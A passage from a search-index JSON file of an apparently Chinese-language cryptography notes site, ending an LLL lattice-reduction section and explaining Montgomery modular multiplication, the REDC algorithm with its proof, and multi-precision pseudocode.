\u200b\u662f\u200b\u4e0a\u9762\u200b\u8fd9\u4e9b\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6839\u200b\u3002\u200b\u628a\u200b\u8fd9\u4e9b\u200b\u591a\u9879\u5f0f\u200b\u5316\u7b80\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e86\u200b\u4e00\u7cfb\u5217\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u7cfb\u6570\u200b\u5411\u91cf\u200b\u6784\u6210\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b LLL \u200b\u7b97\u6cd5\u200b\u89c4\u7ea6\u200b\uff1a\u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u7684\u200b\u57fa\u200b\u5bf9\u5e94\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u5c31\u662f\u200b \\(g(x)\\)\u3002\u200b\u7528\u200b\u8fed\u4ee3\u6cd5\u200b\u6c42\u89e3\u200b \\(g(x)\\)\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b \\(x_0\\)\u3002</p>"},{"location":"cryptography/lll.html#_6","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>Factoring polynomials with rational coefficients</li> <li>Lenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction algorithm</li> <li>Selected Applications of LLL in Number Theory</li> <li>A Course in Computational Algebraic Number Theory</li> </ul>"},{"location":"cryptography/montgomery_mul_mod.html","title":"Montgomery \u200b\u6a21\u4e58","text":"<p>\u200b\u672c\u6587\u200b\u540c\u6b65\u200b\u53d1\u5e03\u200b\u5230\u200b\u672c\u4eba\u200b\u7684\u200b\u77e5\u4e4e\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_1","title":"\u80cc\u666f","text":"<p>\u200b\u5728\u200b\u5bc6\u7801\u5b66\u200b\u4e2d\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u6a21\u4e58\u200b\u64cd\u4f5c\u200b\uff1a\\(a * b \\bmod N\\)\u3002\u200b\u6734\u7d20\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u5148\u6c42\u200b\u51fa\u200b \\(a * b\\)\uff0c\u200b\u518d\u200b\u5bf9\u200b N \u200b\u8fdb\u884c\u200b\u9664\u6cd5\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f59\u6570\u200b\u5c31\u662f\u200b\u6a21\u4e58\u200b\u7684\u200b\u7ed3\u679c\u200b\u3002</p> <p>\u200b\u4f46\u200b\u7531\u4e8e\u200b\u6b64\u65f6\u200b\u7684\u200b \\(a\\) \\(b\\) \\(N\\) \u200b\u4e09\u4e2a\u200b\u6570\u90fd\u200b\u5f88\u5927\u200b\uff0c\u200b\u5728\u200b\u8ba1\u7b97\u673a\u200b\u4e0a\u200b\u9700\u8981\u200b\u7528\u5927\u200b\u6574\u6570\u200b\u6765\u200b\u8868\u793a\u200b\uff0c\u200b\u800c\u200b\u5927\u200b\u6574\u6570\u200b\u7684\u200b\u4e58\u6cd5\u200b\u548c\u200b\u9664\u6cd5\u200b\u90fd\u200b\u662f\u200b\u9700\u8981\u200b\u8017\u200b\u6bd4\u8f83\u200b\u591a\u200b\u7684\u200b\u65f6\u95f4\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b\u7528\u200b Sch\u00f6nhage\u2013Strassen \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u4e24\u4e2a\u200b \\(n\\) \u200b\u4f4d\u5927\u200b\u6574\u6570\u200b\u7684\u200b\u4e58\u6cd5\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u95f4\u200b\u662f\u200b \\(O(n \\log(n) \\log(\\log(n)))\\)\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_2","title":"\u5b9a\u4e49","text":"<p>Montgomery \u200b\u6a21\u4e58\u200b\u662f\u200b\u4e00\u79cd\u200b\u63d0\u9ad8\u200b\u6a21\u4e58\u200b\u7684\u200b\u6027\u80fd\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002\u200b\u5177\u4f53\u200b\u5730\u200b\uff0cMontgomery \u200b\u6a21\u4e58\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u53c2\u6570\u200b \\(R\\) \u200b\u6ee1\u8db3\u200b \\(R\\) \u200b\u548c\u200b \\(N\\) \u200b\u4e92\u8d28\u200b\uff0c\u200b\u4e14\u200b \\(R &gt; N\\)\uff0c\u200b\u90a3\u4e48\u200b Montgomery \u200b\u6a21\u4e58\u200b\u5b9e\u73b0\u200b\u7684\u200b\u662f\u200b\u5982\u4e0b\u200b\u8ba1\u7b97\u200b\uff1a</p> \\[ M(a, b) = a * b * R^{-1} \\bmod N \\]"},{"location":"cryptography/montgomery_mul_mod.html#_3","title":"\u7528\u9014","text":"<p>\u200b\u8fd9\u200b\u770b\u8d77\u6765\u200b\u5f88\u200b\u5947\u602a\u200b\uff0c\u200b\u4e3a\u4ec0\u4e48\u200b\u8981\u200b\u5728\u200b\u539f\u6765\u200b\u7684\u200b \\(a*b\\) \u200b\u4e0a\u200b\u518d\u200b\u591a\u200b\u4e58\u200b\u4e00\u9879\u200b\uff1a\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u628a\u200b\u539f\u6765\u200b\u5bf9\u200b \\(N\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\uff0c\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u5bf9\u200b \\(R\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\uff0c\u200b\u800c\u200b\u5982\u679c\u200b\u628a\u200b \\(R\\) \u200b\u9009\u62e9\u200b\u4e3a\u200b\u4e8c\u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u786c\u4ef6\u200b\u4e0a\u200b\u5b9e\u73b0\u200b \\(R\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\u5c31\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u4f4d\u200b\u8fd0\u7b97\u200b\u5373\u53ef\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u514d\u53bb\u200b\u4e86\u200b\u539f\u6765\u200b\u5f88\u6162\u200b\u7684\u200b\u9664\u6cd5\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\u4f1a\u200b\u5f15\u5165\u200b\u989d\u5916\u200b\u7684\u200b \\(R^{-1}\\) \u200b\u7cfb\u6570\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\u4e0d\u662f\u200b\u60f3\u8981\u200b\u7684\u200b \\(a * b\\)\u3002\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u9884\u5148\u200b\u8ba1\u7b97\u200b\u597d\u200b \\(R^2 \\bmod N\\)\uff0c\u200b\u7136\u540e\u200b\u5148\u200b\u7528\u200b Montgomery \u200b\u6a21\u4e58\u200b\u628a\u200b\u8981\u200b\u8ba1\u7b97\u200b\u7684\u200b\u6570\u200b\u90fd\u200b\u4e58\u4ee5\u200b \\(R\\)\uff1a</p> \\[\\begin{align} M(a, R^2) \\equiv a * R^2 * R^{-1} \\equiv aR \\pmod N \\\\ M(b, R^2) \\equiv b * R^2 * R^{-1} \\equiv bR \\pmod N \\\\ \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u6240\u6709\u200b\u6570\u90fd\u200b\u81ea\u5e26\u200b\u4e00\u4e2a\u200b \\(R\\) \u200b\u7684\u200b\u7cfb\u6570\u200b\uff0c\u200b\u6b64\u65f6\u200b\u518d\u200b\u8fdb\u884c\u200b Montgomery \u200b\u4e58\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\uff1a</p> \\[ M(aR, bR) \\equiv (aR) * (bR) * R^{-1} \\equiv abR \\pmod N \\] <p>\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b \\(ab\\) \u200b\u4e58\u4ee5\u200b \\(R\\) \u200b\u7684\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u7ed3\u679c\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u548c\u200b\u5176\u4ed6\u200b\u5e26\u6709\u200b \\(R\\) \u200b\u7cfb\u6570\u200b\u7684\u200b\u503c\u200b\u8fdb\u884c\u200b\u8fd0\u7b97\u200b\u3002\u200b\u5f53\u200b\u6700\u540e\u200b\u8fd0\u7b97\u200b\u5b8c\u6210\u200b\u4ee5\u540e\u200b\uff0c\u200b\u8981\u200b\u628a\u200b\u7ed3\u679c\u200b\u6062\u590d\u200b\u5230\u200b\u539f\u6765\u200b\u7684\u200b\u503c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u518d\u200b\u548c\u200b \\(1\\) \u200b\u8fdb\u884c\u200b Montgomery \u200b\u4e58\u200b\uff0c\u200b\u5373\u53ef\u200b\u5f97\u5230\u200b\u6700\u7ec8\u200b\u7ed3\u679c\u200b</p> \\[ M(abR, 1) \\equiv abR * 1 * R^{-1} \\equiv ab \\bmod N \\] <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u7528\u200b Montgomery \u200b\u6a21\u4e58\u6765\u200b\u8fdb\u884c\u200b\u52a0\u901f\u200b\uff0c\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b\u4e09\u4e2a\u200b\u6b65\u9aa4\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u6b65\u200b\uff0c\u200b\u628a\u200b\u6240\u6709\u200b\u6570\u90fd\u200b\u8fdb\u884c\u200b Montgomery \u200b\u6a21\u4e58\u200b\uff0c\u200b\u4e58\u4ee5\u200b \\(R^2 \\bmod N\\)\uff0c\u200b\u628a\u200b\u6240\u6709\u200b\u6570\u90fd\u200b\u6dfb\u52a0\u200b\u4e0a\u200b \\(R\\) \u200b\u7684\u200b\u7cfb\u6570\u200b</li> <li>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0c\u200b\u6309\u7167\u200b\u6b63\u5e38\u200b\u7684\u200b\u6d41\u7a0b\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u6240\u6709\u200b\u503c\u200b\u90fd\u200b\u5e26\u6709\u200b \\(R\\) \u200b\u7cfb\u6570\u200b\uff0c\u200b\u540c\u65f6\u200b\u6240\u6709\u200b\u7684\u200b\u6a21\u4e58\u200b\u90fd\u200b\u88ab\u200b\u66ff\u6362\u200b\u4e3a\u4e86\u200b\u66f4\u52a0\u200b\u9ad8\u6548\u200b\u7684\u200b Montgomery \u200b\u6a21\u4e58\u200b</li> <li>\u200b\u7b2c\u4e09\u6b65\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u548c\u200b \\(1\\) \u200b\u8fdb\u884c\u200b Montgomery \u200b\u6a21\u4e58\u200b\uff0c\u200b\u8fd8\u539f\u200b\u4e3a\u200b\u771f\u5b9e\u200b\u503c\u200b</li> </ol> <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u53ea\u8981\u200b\u4e2d\u95f4\u200b\u8ba1\u7b97\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u662f\u200b\u5927\u5934\u200b\uff0c\u200b\u521d\u59cb\u5316\u200b\u548c\u200b\u6700\u540e\u200b\u7684\u200b\u5904\u7406\u200b\u65f6\u95f4\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5ffd\u7565\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4eab\u53d7\u200b\u5230\u200b Montgomery \u200b\u6a21\u4e58\u200b\u5e26\u6765\u200b\u7684\u200b\u6027\u80fd\u200b\u63d0\u5347\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_4","title":"\u7b97\u6cd5","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u4ecb\u7ecd\u200b Montgomery \u200b\u7684\u200b\u5177\u4f53\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u770b\u770b\u200b\u5b83\u200b\u5982\u4f55\u200b\u63d0\u9ad8\u200b\u6a21\u4e58\u200b\u6027\u80fd\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#redc","title":"REDC","text":"<p>\u200b\u9996\u5148\u200b\u4ecb\u7ecd\u200b Montgomery \u200b\u7684\u200b REDC \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8ba1\u7b97\u200b \\(a * b * R^{-1} \\bmod N\\) \u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u6b65\u9aa4\u200b\u662f\u200b\uff1a</p> <ol> <li>\u200b\u9884\u5148\u200b\u8ba1\u7b97\u200b \\(N'\\)\uff0c\u200b\u6ee1\u8db3\u200b \\(NN' \\equiv -1 \\bmod R\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(T=a*b\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(m=((T \\bmod R)N') \\bmod R\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(t=(T + mN) / R\\)</li> <li>\u200b\u5982\u679c\u200b \\(t \\ge N\\)\uff0c\u200b\u90a3\u4e48\u200b \\(a * b * R^{-1} \\bmod N = t - N\\)</li> <li>\u200b\u5426\u5219\u200b \\(a * b * R^{-1} \\bmod N = t\\)</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u53ea\u200b\u6d89\u53ca\u200b\u5230\u200b\u5173\u4e8e\u200b \\(R\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\uff0c\u200b\u4e0d\u200b\u6d89\u53ca\u200b\u5230\u200b\u5173\u4e8e\u200b \\(N\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\u3002\u200b\u4e0b\u9762\u200b\u63a8\u5bfc\u200b\u4e00\u4e0b\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0a\u9762\u200b\u7684\u200b\u516c\u5f0f\u200b\u662f\u200b\u6b63\u786e\u200b\u7684\u200b\uff1a</p> <p>\u200b\u9996\u5148\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u51fa\u73b0\u200b\u4e86\u200b \\(t = (T+mN) / R\\)\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b \\(t\\) \u200b\u662f\u200b\u6574\u6570\u200b\uff0c\u200b\u9700\u8981\u200b\u8bc1\u660e\u200b \\(T+mN\\) \u200b\u53ef\u4ee5\u200b\u6574\u9664\u200b \\(R\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u8981\u6c42\u200b \\(T + mN \\equiv 0 \\pmod R\\)\uff1a</p> \\[\\begin{align} T + mN &amp;\\equiv T + (((T \\bmod R)N') \\bmod R)N \\pmod R \\\\ &amp;\\equiv T + TN'N \\pmod R \\\\ &amp;\\equiv T + T(-1) \\pmod R \\\\ &amp;\\equiv 0 \\pmod R \\end{align}\\] <p>\u200b\u8bf4\u660e\u200b \\(t\\) \u200b\u662f\u200b\u6574\u6570\u200b\u3002\u200b\u5176\u6b21\u200b\uff0c\u200b\u9700\u8981\u200b\u8bc1\u660e\u200b \\(a * b * R^{-1} \\equiv t \\pmod N\\)\uff1a</p> \\[\\begin{align} t &amp;= (T + mN) / R \\\\ &amp;\\equiv (T + mN) R^{-1} \\pmod N \\\\ &amp;\\equiv TR^{-1} + mNR^{-1} \\pmod N \\\\ &amp;\\equiv TR^{-1} + 0 \\pmod N \\\\ &amp;\\equiv a * b * R^{-1} \\pmod N \\end{align}\\] <p>\u200b\u8bf4\u660e\u200b \\(t\\) \u200b\u548c\u200b\u7b54\u6848\u200b \\(a * b * R^{-1}\\) \u200b\u5728\u6a21\u200b \\(N\\) \u200b\u610f\u4e49\u200b\u4e0b\u200b\u76f8\u7b49\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b \\(m\\) \u200b\u7684\u200b\u5b9a\u4e49\u200b\uff0c\\(m\\) \u200b\u7684\u200b\u8303\u56f4\u200b\u662f\u200b \\([0, R-1]\\)\uff0c\u200b\u540c\u65f6\u200b \\(a, b \\in [0, N-1]\\)\uff0c\u200b\u4e14\u200b\u5df2\u77e5\u200b \\(N &lt; R\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(t\\) \u200b\u7684\u200b\u8303\u56f4\u200b\uff1a</p> \\[\\begin{align} t &amp;= (T+mN) / R \\\\ &amp;= (ab + mN) / R \\\\ &amp;\\le ((N-1)(N-1) + (R-1)N) / R \\\\ &amp;&lt; (RN + RN) / R \\\\ &amp;= N + N \\\\ &amp;= 2N \\end{align}\\] <p>\u200b\u56e0\u6b64\u200b \\(t \\in [0, 2N-1]\\)\u3002\u200b\u524d\u9762\u200b\u5df2\u7ecf\u200b\u8bc1\u660e\u200b\uff0c\\(t\\) \u200b\u548c\u200b\u7b54\u6848\u200b \\(a * b * R^{-1}\\) \u200b\u5728\u6a21\u200b \\(N\\) \u200b\u610f\u4e49\u200b\u4e0b\u200b\u76f8\u7b49\u200b\u3002\u200b\u5728\u200b \\([0, 2N-1]\\) \u200b\u8303\u56f4\u200b\u5185\u200b\uff0c\u200b\u6a21\u200b \\(N\\) \u200b\u610f\u4e49\u200b\u4e0b\u200b\u76f8\u7b49\u200b\u53ea\u6709\u200b\u4e24\u79cd\u200b\u53ef\u80fd\u200b\uff1a\u200b\u76f8\u7b49\u200b\u6216\u8005\u200b\u5dee\u200b\u4e00\u4e2a\u200b \\(N\\)\u3002\u200b\u6240\u4ee5\u200b REDC \u200b\u7b97\u6cd5\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u6b65\u200b\u5c31\u662f\u200b\uff1a\u200b\u5982\u679c\u200b \\(t \\ge N\\)\uff0c\u200b\u53ea\u200b\u53ef\u80fd\u200b \\(t\\) \u200b\u548c\u200b\u7b54\u6848\u200b\u5dee\u200b\u4e00\u4e2a\u200b \\(N\\)\uff0c\u200b\u6240\u4ee5\u200b\u7b54\u6848\u200b \\(a * b * R^{-1} \\bmod N = t - N\\)\uff1b\u200b\u5426\u5219\u200b \\(t &lt; N\\)\uff0c\u200b\u6b64\u65f6\u200b\u7b54\u6848\u200b \\(a * b * R^{-1} \\bmod N = t\\)\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#montgomery_1","title":"\u5927\u200b\u6574\u6570\u200b Montgomery \u200b\u6a21\u4e58","text":"<p>\u200b\u5b9e\u9645\u200b\u5728\u200b\u8ba1\u7b97\u673a\u200b\u4e0a\u200b\u8fd0\u884c\u200b Montgomery \u200b\u7b97\u6cd5\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u8fd9\u4e9b\u200b\u6570\u90fd\u200b\u5f88\u5927\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e3a\u4e86\u200b\u8868\u793a\u200b\u5927\u200b\u6574\u6570\u200b\uff0c\u200b\u9700\u8981\u200b\u7528\u200b\u56fa\u5b9a\u200b\u4f4d\u6570\u200b\u7684\u200b\u6574\u6570\u200b\u6570\u7ec4\u200b\u6765\u200b\u8868\u793a\u200b\uff0c\u200b\u4f8b\u5982\u200b\u7528\u200b\u591a\u4e2a\u200b 64 \u200b\u4f4d\u200b\u6574\u6570\u200b\u6765\u200b\u8868\u793a\u200b\u4e00\u4e2a\u200b\u5927\u200b\u6574\u6570\u200b\u3002\u200b\u6b64\u65f6\u200b\uff0c\u200b\u628a\u200b\u5927\u200b\u6574\u6570\u200b\u8fd0\u7b97\u200b\u62c6\u6210\u200b\u591a\u4e2a\u200b 64 \u200b\u4f4d\u200b\u6574\u6570\u200b\u7684\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u5927\u200b\u6574\u6570\u200b\u7684\u200b\u8fd0\u7b97\u200b\u548c\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7ed3\u5408\u200b\u5728\u200b\u4e00\u8d77\u200b\uff0c\u200b\u5f97\u5230\u200b\u66f4\u200b\u9ad8\u6027\u80fd\u200b\u7684\u200b Montgomery \u200b\u6a21\u4e58\u200b\u3002</p> <p>\u200b\u8bba\u6587\u200b Analyzing and Comparing Montgomery Multiplication Algorithms \u200b\u5206\u6790\u200b\u4e86\u200b\u51e0\u79cd\u200b\u6df7\u5408\u200b\u4e86\u200b\u5927\u200b\u6574\u6570\u200b\u8fd0\u7b97\u200b\u548c\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7684\u200b\u7b97\u6cd5\u200b\u3002\u200b\u4e0b\u9762\u200b\u8bb2\u89e3\u200b\u8bba\u6587\u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b\u90e8\u5206\u200b\u7b97\u6cd5\u200b\u3002</p> <p>\u200b\u5728\u200b\u4e0b\u9762\u200b\u7684\u200b\u8ba8\u8bba\u200b\u4e2d\u200b\uff0c\u200b\u5047\u8bbe\u200b\u673a\u5668\u200b\u6574\u6570\u200b\u7684\u200b\u5bbd\u5ea6\u200b\u662f\u200b \\(w\\) \u200b\u4f4d\u200b\uff0c\u200b\u4f8b\u5982\u200b \\(w=64\\) \u200b\u8868\u793a\u200b\u7528\u200b 64 \u200b\u4f4d\u200b\u6574\u6570\u200b\u8fdb\u884c\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u6b64\u65f6\u200b \\(R=2^{sw}\\)\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\\(R\\) \u200b\u7b49\u4e8e\u200b \\(s\\) \u200b\u4e2a\u200b \\(w\\) \u200b\u4f4d\u200b\u6574\u6570\u200b\u53ef\u4ee5\u200b\u8868\u793a\u200b\u7684\u200b\u6700\u5927\u503c\u200b\u52a0\u4e00\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9664\u4ee5\u200b \\(R\\) \u200b\u76f8\u5f53\u4e8e\u200b\u820d\u5f03\u200b\u6700\u4f4e\u200b\u7684\u200b \\(s\\) \u200b\u4e2a\u200b \\(w\\) \u200b\u4f4d\u200b\u6574\u6570\u200b\u3002\u200b\u540c\u65f6\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b\uff0c\\(a\\) \\(b\\) \\(N\\) \u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7528\u200b \\(s\\) \u200b\u4e2a\u200b \\(w\\) \u200b\u4f4d\u200b\u6574\u6570\u200b\u8868\u793a\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#separated-operand-scanning","title":"Separated Operand Scanning","text":"<p>\u200b\u7b2c\u4e00\u79cd\u200b\u65b9\u6cd5\u200b\u662f\u200b Separated Operand Scanning \u200b\u65b9\u6cd5\u200b\uff08\u200b\u540c\u65f6\u200b\u4e5f\u200b\u662f\u200b Wikipedia \u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b MultiPrecisionREDC \u200b\u7b97\u6cd5\u200b\uff09\uff0c\u200b\u5b83\u200b\u7684\u200b\u6b65\u9aa4\u200b\u662f\u200b\uff1a</p> <p>\u200b\u7b2c\u4e00\u6b65\u200b\uff1a\u200b\u6309\u7167\u200b\u4f20\u7edf\u200b\u65b9\u5f0f\u200b\u8fdb\u884c\u200b\u5927\u200b\u6574\u6570\u200b\u4e58\u6cd5\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(T = a*b\\)\uff1a</p> <pre><code># t = a * b\nfor i=0 to s-1\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[i+j] + a[j]*b[i] + C\n        t[i+j] := S\n    t[i+s] := C\n</code></pre> <p>\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u653e\u5728\u200b \\(t\\) \u200b\u6570\u7ec4\u200b\u4e2d\u200b\u3002</p> <p>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0c\u200b\u6c42\u200b \\(t = (T + mN) / R\\)\uff0c\u200b\u6b64\u65f6\u200b \\(T\\) \u200b\u5df2\u7ecf\u200b\u8ba1\u7b97\u51fa\u6765\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u9996\u5148\u200b\u8981\u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(m=((T \\bmod R)N') \\bmod R\\)\uff0c\u200b\u5728\u200b\u8fd9\u91cc\u200b \\(\\bmod R\\) \u200b\u5c31\u662f\u200b\u53d6\u200b\u5927\u6570\u200b\u7684\u200b\u6700\u4f4e\u200b \\(s\\) \u200b\u4e2a\u200b \\(w\\) \u200b\u4f4d\u200b\u6574\u6570\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7b80\u5316\u200b\u5927\u200b\u6574\u6570\u200b\u4e58\u6cd5\u200b\u4e3a\u200b\uff1a</p> <pre><code># m = ((T % R) * N') % R\nfor i=0 to s-1\n    C := 0\n    for j=0 to s-i-1\n        (C, S) := m[i+j] + t[i]*n'[j] + C\n        m[i+j] := S\n</code></pre> <p>\u200b\u63a5\u4e0b\u6765\u200b\u6c42\u5927\u200b\u6574\u6570\u200b \\(m\\) \u200b\u4e58\u4ee5\u200b\u5927\u200b\u6574\u6570\u200b \\(N\\) \u200b\u7684\u200b\u79ef\u200b\uff0c\u200b\u6c42\u79ef\u200b\u7684\u200b\u540c\u65f6\u200b\u628a\u200b\u7ed3\u679c\u200b\u7d2f\u52a0\u200b\u5230\u200b \\(T\\) \u200b\u4e0a\u200b\u3002\u200b\u4f2a\u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code># t += m * N\nfor i=0 to s-1\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[i+j] + m[i]*n[j] + C\n        t[i+j] := S\n    ADD (t[i+s], C)\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b ADD \u200b\u51fd\u6570\u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5927\u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\u8fd0\u7b97\u200b\u91cc\u9762\u200b\uff0c\u200b\u6c42\u548c\u200b\u540e\u200b\u4e0d\u65ad\u200b\u8fdb\u4f4d\u200b\u76f4\u5230\u200b\u4e0d\u518d\u200b\u8fdb\u4f4d\u200b\u4e3a\u6b62\u200b\u7684\u200b\u51fd\u6570\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u5c55\u5f00\u200b\u4e86\u200b\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u91cc\u200b\u6709\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u4f18\u5316\u200b\uff1a\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u628a\u200b \\(m\\) \u200b\u6574\u4e2a\u200b\u5927\u200b\u6574\u6570\u200b\u8ba1\u7b97\u51fa\u6765\u200b\uff0c\u200b\u800c\u662f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u6c42\u200b \\(T + mN\\)\uff1a\u200b\u56de\u5fc6\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u6700\u521d\u200b\u8ba1\u7b97\u200b \\(T + mN\\) \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u6574\u9664\u200b \\(R\\)\uff0c\u200b\u73b0\u5728\u200b\u628a\u200b \\(T + mN\\) \u200b\u7684\u200b\u8ba1\u7b97\u200b\u62c6\u6210\u200b \\(s\\) \u200b\u4e2a\u200b\u5c0f\u6b65\u200b\uff1a\u200b\u7b2c\u200b \\(i\\) \u200b\u6b65\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u6574\u9664\u200b \\(2^{(i+1)w}\\)\uff1a</p> <p>\u200b\u7b2c\u4e00\u6b65\u200b\uff1a\\(T + m_1N \\equiv 0 \\pmod{2^w}\\)\uff0c\u200b\u6b64\u65f6\u200b \\(m_1 = T * N' \\bmod 2^w\\)\uff0c\u200b\u5bf9\u5e94\u200b\u5728\u200b\u4ee3\u7801\u200b\u4e0a\u200b\uff0c\u200b\u5c31\u662f\u200b <code>m_1 = t[0] * n'[0]</code>\uff0c\u200b\u820d\u53bb\u200b\u6ea2\u51fa\u200b\u7684\u200b\u90e8\u5206\u200b\u3002</p> <p>\u200b\u7b2c\u4e8c\u6b65\u200b\uff1a\\(T + m_1N + m_22^wN \\equiv 0 \\pmod{2^{2w}}\\)\uff0c\u200b\u6b64\u65f6\u200b \\(m_2 * 2^w = (T + m_1N) * N' \\bmod 2^{2w}\\)\uff0c\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u60ca\u559c\u200b\u5730\u200b\u53d1\u73b0\u200b\uff0c\u200b\u7531\u4e8e\u200b \\(T + m_1N\\) \u200b\u662f\u200b \\(2^w\\) \u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8ba1\u7b97\u200b \\((T + m_1N) * N'\\) \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\\(T + m_1N\\) \u200b\u7684\u200b\u4f4e\u200b \\(w\\) 